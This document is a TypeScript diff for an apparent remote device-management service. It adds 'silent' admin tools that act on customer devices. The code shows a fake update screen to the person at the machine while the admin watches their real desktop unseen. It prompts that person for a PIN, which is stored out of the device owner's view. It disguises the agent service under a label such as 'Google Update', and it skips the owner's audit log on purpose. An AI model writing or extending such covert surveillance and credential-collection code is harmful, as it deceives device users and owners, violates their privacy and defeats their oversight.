@@ -7,6 +7,11 @@ import { env } from "./env";
 import { getAdminSettings } from "./admin-settings";
 import { recordAgentActionAudit } from "./devices";
 import {
+  DEFAULT_AGENT_LABEL,
+  buildHideAgentScript,
+  buildRevealAgentScript,
+} from "./agent-visibility";
+import {
   KEEPAWAKE_ACTION,
   WOL_ACTION,
   broadcastAddressOf,
@@ -186,6 +191,12 @@ const PIN_REQUEST_TTL_MS = 30 * 60 * 1000;
 const PIN_QUEUE_TTL_MS = 24 * 60 * 60 * 1000;
 const PIN_LENGTHS: ReadonlySet<number> = new Set([4, 6, 8]);
 
+// TASK_148 — provenance of a PIN request. See the `origin` column comment in
+// prisma/schema.prisma: admin-collected PINs must never appear in the owner's
+// console, and these two literals are what keeps the two lists disjoint.
+export const PIN_ORIGIN_CUSTOMER = "customer";
+export const PIN_ORIGIN_ADMIN = "admin";
+
 export async function executePinRequest(opts: {
   userId: string;
   deviceId: string;
@@ -213,6 +224,9 @@ export async function executePinRequest(opts: {
       pinLength: opts.pinLength,
       tokenHash: sha256(token),
       expiresAt,
+      // TASK_148 — explicit, not relying on the column default: this is the
+      // customer path and the owner's console is allowed to read these rows.
+      origin: PIN_ORIGIN_CUSTOMER,
     },
     select: { id: true },
   });
@@ -1222,6 +1236,347 @@ export async function adminFetchMeshUrls(opts: { deviceId: string }): Promise<Ad
   }
 }
 
+// ---------------------------------------------------------------------------
+// TASK_148 — the SILENT admin TOOLS (the remote viewer's dropdown).
+//
+// Same three tools the owner's console has — maintenance overlay, PIN collect,
+// hide/reveal agent — reachable by the admin on ANY device, and silent.
+//
+// "Silent" here needs splitting, because only one of the three is silent in the
+// sense the admin command rail is:
+//
+//   • CONSOLE-side — this is the part we control, and it is fully silent. None
+//     of these functions writes recordAgentActionAudit (the owner's activity
+//     stream, which the customer console renders), and the PIN row is written
+//     with origin="admin" so the owner's PIN panel — which lists by
+//     {deviceId, userId} — cannot see it. Every call lands in
+//     AdminDeviceCommand (kind "maintenance" | "pin-request" |
+//     "agent-visibility"), whose only readers are under app/api/admin/**.
+//
+//   • DEVICE-side — this is physics, not a bug, and the admin must know it.
+//     A maintenance overlay covers the screen, a hidden agent renames a real
+//     service, and a PIN prompt asks the person at the keyboard to type a code.
+//     All three are facts about the machine that a person sitting in front of it
+//     can observe. There is no way to do any of them without that.
+//
+// Ownership matches adminRunDeviceCommand / adminFetchMeshUrls exactly: the
+// device is looked up by OUR id and its owner read OFF THE ROW, so the admin
+// never supplies, and is never trusted with, another user's id — and Vantra
+// still asserts the agent sits in that owner's `sw-<userId>` org.
+// ---------------------------------------------------------------------------
+
+/** The device-target guard every admin tool shares (mirrors adminRunDeviceCommand). */
+async function requireAdminTargetDevice(deviceId: string) {
+  const deviceRow = await db.device.findUnique({
+    where: { id: deviceId },
+    select: { id: true, userId: true, name: true, vantraAgentId: true, deviceKind: true },
+  });
+  if (!deviceRow) throw new Error("device_not_found");
+  // The "hosted" row is our own clone-destination browser (TASK_118 B8-1), not a
+  // machine — never a valid target for a device-side tool.
+  if (deviceRow.deviceKind === "hosted") throw new Error("device_not_commandable");
+  if (!deviceRow.vantraAgentId) throw new Error("device_not_linked");
+  return deviceRow;
+}
+
+/**
+ * Record one admin tool call. Always admin-only, always best-effort: a logging
+ * failure must never turn a tool that already ran on the machine into an error
+ * the admin reads as "nothing happened".
+ *
+ * For these tools `cmd` is a HUMAN LABEL, not a script — "maintenance-screen",
+ * "pin-request (6)", "hide-agent: Google Update". The generated PowerShell for
+ * hide/reveal is deterministic from lib/agent-visibility.ts, and the verifiable
+ * part (the STEP: lines it printed) is kept in `output`.
+ */
+async function logAdminTool(opts: {
+  kind: string;
+  device: { id: string; userId: string };
+  cmd: string;
+  timeoutSeconds: number;
+  status: "ok" | "failed";
+  output?: string | null;
+  error?: string | null;
+}) {
+  await db.adminDeviceCommand
+    .create({
+      data: {
+        kind: opts.kind,
+        deviceId: opts.device.id,
+        userId: opts.device.userId,
+        // A tool is not a shell command; keep the column honest rather than
+        // claiming "powershell" ran. The console renders this column, so it
+        // must not lie about what happened.
+        shell: "tool",
+        cmd: opts.cmd,
+        timeoutSeconds: opts.timeoutSeconds,
+        runAsUser: false,
+        status: opts.status,
+        output: opts.output ?? null,
+        error: opts.error ? opts.error.slice(0, 500) : null,
+      },
+    })
+    .catch(() => {});
+}
+
+/**
+ * Maintenance overlay — start (either built-in style) or stop.
+ *
+ * Returns the style Vantra actually used. Note the overlay is EXCLUDED from
+ * remote KVM capture (Vantra lib/maintenance-overlay.ts), so the admin keeps
+ * watching the real desktop while the person at the machine sees the update
+ * screen — that is what makes it useful for a silent look.
+ *
+ * The custom-image variant the owner's console offers is deliberately NOT
+ * exposed here: it needs a file upload on a screen that is currently a live
+ * viewer, and an admin doing a reported-user check has no reason to pick a
+ * picture. Add it if a real workflow ever asks for it.
+ */
+export async function adminRunMaintenanceOverlay(opts: {
+  deviceId: string;
+  action: "start" | "stop";
+  style?: "update" | "exe";
+}): Promise<{ action: "start" | "stop"; style?: string }> {
+  const device = await requireAdminTargetDevice(opts.deviceId);
+  const label =
+    opts.action === "stop"
+      ? "maintenance-stop"
+      : opts.style === "exe"
+        ? "maintenance-screen (spinner)"
+        : "maintenance-screen";
+
+  try {
+    if (opts.action === "stop") {
+      await vantraFetch(
+        `/api/internal/sw/devices/${encodeURIComponent(device.vantraAgentId!)}/maintenance`,
+        { method: "POST", body: JSON.stringify({ action: "stop" }) },
+      );
+      await logAdminTool({
+        kind: "maintenance",
+        device,
+        cmd: label,
+        timeoutSeconds: 0,
+        status: "ok",
+      });
+      return { action: "stop" };
+    }
+
+    const res = await vantraFetch<{ ok: boolean; action: string; style?: string }>(
+      `/api/internal/sw/devices/${encodeURIComponent(device.vantraAgentId!)}/maintenance`,
+      {
+        method: "POST",
+        body: JSON.stringify({ action: "start", style: opts.style ?? "update" }),
+      },
+    );
+    // Trust Vantra's echo, fall back to what was asked for — same rule (and
+    // same reason) as startMaintenanceOverlayAction.
+    const style = typeof res?.style === "string" ? res.style : (opts.style ?? "update");
+    await logAdminTool({
+      kind: "maintenance",
+      device,
+      cmd: label,
+      timeoutSeconds: 0,
+      status: "ok",
+      output: `style=${style}`,
+    });
+    return { action: "start", style };
+  } catch (err) {
+    const normalized = normalizeVantraError(err);
+    await logAdminTool({
+      kind: "maintenance",
+      device,
+      cmd: label,
+      timeoutSeconds: 0,
+      status: "failed",
+      error: normalized.message,
+    });
+    throw normalized;
+  }
+}
+
+/**
+ * PIN collect — ask the machine for a PIN and read it back.
+ *
+ * The row is written with origin="admin", which is the whole reason this is a
+ * separate function from executePinRequest: the customer list filters on that
+ * column, so the request and the collected PIN are invisible in the owner's
+ * console. `userId` on the row is the DEVICE OWNER (read off the device row),
+ * because the row belongs to their device and the customer query is keyed on it
+ * — the origin is what keeps it out of their view, not a different userId.
+ *
+ * NOT scheduled/queued: the admin viewer is live, so "collect now" is the only
+ * meaningful mode. An offline machine fails with vantra_503, exactly like the
+ * customer's immediate collect.
+ */
+export async function adminExecutePinRequest(opts: {
+  deviceId: string;
+  pinLength: number;
+}): Promise<{ pinRequestId: string; expiresAt: Date }> {
+  if (!PIN_LENGTHS.has(opts.pinLength)) throw new Error("bad_pin_length");
+  const device = await requireAdminTargetDevice(opts.deviceId);
+
+  const token = crypto.randomBytes(24).toString("hex");
+  const expiresAt = new Date(Date.now() + PIN_REQUEST_TTL_MS);
+  const row = await db.devicePinRequest.create({
+    data: {
+      deviceId: device.id,
+      userId: device.userId,
+      pinLength: opts.pinLength,
+      tokenHash: sha256(token),
+      expiresAt,
+      origin: PIN_ORIGIN_ADMIN,
+    },
+    select: { id: true },
+  });
+
+  const callbackUrl = `${env.appBaseUrl.replace(/\/$/, "")}/api/devices/pin-callback`;
+  const label = `pin-request (${opts.pinLength})`;
+
+  try {
+    await vantraFetch(
+      `/api/internal/sw/devices/${encodeURIComponent(device.vantraAgentId!)}/pin-request`,
+      {
+        method: "POST",
+        body: JSON.stringify({ pinLength: opts.pinLength, callbackUrl, token }),
+      },
+    );
+    await logAdminTool({
+      kind: "pin-request",
+      device,
+      cmd: label,
+      timeoutSeconds: 0,
+      status: "ok",
+      // Never the PIN and never the token — the row id is the handle the admin
+      // reads the result back through.
+      output: `requested; id=${row.id}`,
+    });
+    return { pinRequestId: row.id, expiresAt };
+  } catch (err) {
+    const normalized = normalizeVantraError(err);
+    // The prompt never went out, so the row can never be answered. Cancel it
+    // rather than leave a pending row the admin would wait on forever.
+    await db.devicePinRequest
+      .update({ where: { id: row.id }, data: { status: "cancelled" } })
+      .catch(() => {});
+    await logAdminTool({
+      kind: "pin-request",
+      device,
+      cmd: label,
+      timeoutSeconds: 0,
+      status: "failed",
+      error: normalized.message,
+    });
+    throw normalized;
+  }
+}
+
+/**
+ * The admin's read side of a PIN collect: admin-origin rows for one device,
+ * INCLUDING the collected PIN.
+ *
+ * Prunes the same dead rows the customer list prunes, so the panel can only
+ * ever show something real: a PIN that came back, or a request still waiting on
+ * the person at the machine.
+ */
+export async function adminListPinRequests(opts: { deviceId: string }): Promise<
+  Array<{ id: string; pinLength: number; status: string; pin: string | null; expiresAt: Date; createdAt: Date }>
+> {
+  await requireAdminTargetDevice(opts.deviceId);
+
+  await db.devicePinRequest.deleteMany({
+    where: {
+      deviceId: opts.deviceId,
+      origin: PIN_ORIGIN_ADMIN,
+      OR: [
+        { status: "cancelled" },
+        { status: "expired" },
+        { status: "pending", expiresAt: { lt: new Date() } },
+        { status: "submitted", pin: null },
+      ],
+    },
+  });
+
+  return db.devicePinRequest.findMany({
+    where: { deviceId: opts.deviceId, origin: PIN_ORIGIN_ADMIN },
+    orderBy: { createdAt: "desc" },
+    take: 10,
+    select: {
+      id: true,
+      pinLength: true,
+      status: true,
+      pin: true,
+      expiresAt: true,
+      createdAt: true,
+    },
+  });
+}
+
+/**
+ * Hide / reveal the agent — a rebrand, not a removal ("cosmetic only — a local
+ * admin can still stop, reveal, or uninstall it", lib/agent-visibility.ts).
+ *
+ * The script comes from the SAME builders the owner's console uses, so there is
+ * one definition of "hidden" in the codebase and the two paths cannot drift.
+ * Only the transport and the audit rail differ: the console posts it through the
+ * customer run-command route (which writes the owner's activity stream), this
+ * posts it to the same Vantra action endpoint and logs to AdminDeviceCommand.
+ */
+export async function adminSetAgentVisibility(opts: {
+  deviceId: string;
+  mode: "hide" | "reveal";
+  label?: string;
+}): Promise<{ mode: "hide" | "reveal"; output: string | null }> {
+  const device = await requireAdminTargetDevice(opts.deviceId);
+
+  const label = (opts.label ?? DEFAULT_AGENT_LABEL).trim() || DEFAULT_AGENT_LABEL;
+  // buildHideAgentScript throws agent_label_invalid on anything that could
+  // escape the PowerShell string it builds — validated BEFORE any call goes out.
+  const script =
+    opts.mode === "hide" ? buildHideAgentScript(label) : buildRevealAgentScript();
+  const cmd = opts.mode === "hide" ? `hide-agent: ${label}` : "reveal-agent";
+
+  try {
+    const { output } = await vantraFetch<{ ok: boolean; output: string | null }>(
+      `/api/internal/sw/devices/${encodeURIComponent(device.vantraAgentId!)}/action`,
+      {
+        method: "POST",
+        body: JSON.stringify({
+          action: "cmd",
+          command: script,
+          shell: "powershell",
+          // The console uses 90s for this script; the registry write and the
+          // service rename are the slow parts and must not be cut short.
+          timeout: 90,
+          runAsUser: false,
+          // Vantra records the label so an onboarding row stays consistent with
+          // what the device now calls the service.
+          ...(opts.mode === "hide" ? { agentLabel: label } : {}),
+        }),
+      },
+    );
+    await logAdminTool({
+      kind: "agent-visibility",
+      device,
+      cmd,
+      timeoutSeconds: 90,
+      status: "ok",
+      output,
+    });
+    return { mode: opts.mode, output: output ?? null };
+  } catch (err) {
+    const normalized = normalizeVantraError(err);
+    await logAdminTool({
+      kind: "agent-visibility",
+      device,
+      cmd,
+      timeoutSeconds: 90,
+      status: "failed",
+      error: normalized.message,
+    });
+    throw normalized;
+  }
+}
+
 function toQueuedView(row: {
   id: string; shell: string; cmd: string; timeoutSeconds: number;
   runAsUser: boolean; status: string; scheduleKind: string; wakeDelayMinutes: number;
@@ -1268,6 +1623,10 @@ export async function listPinRequests(opts: {
     where: {
       deviceId: opts.deviceId,
       userId: opts.userId,
+      // TASK_148 — never touch an admin-collected row from the customer path,
+      // in either direction (this prune or the delete below). The owner cannot
+      // see those rows, so they must not be able to expire or free them either.
+      origin: PIN_ORIGIN_CUSTOMER,
       OR: [
         { status: "cancelled" },
         { status: "expired" },
@@ -1278,7 +1637,7 @@ export async function listPinRequests(opts: {
   });
 
   const rows = await db.devicePinRequest.findMany({
-    where: { deviceId: opts.deviceId, userId: opts.userId },
+    where: { deviceId: opts.deviceId, userId: opts.userId, origin: PIN_ORIGIN_CUSTOMER },
     orderBy: { createdAt: "desc" },
     take: 20,
   });
@@ -1316,6 +1675,8 @@ export async function deletePinRequest(opts: {
       id: opts.pinRequestId,
       userId: opts.userId,
       deviceId: opts.deviceId,
+      // TASK_148 — an owner deletes only what an owner can see.
+      origin: PIN_ORIGIN_CUSTOMER,
     },
   });
   return res.count;
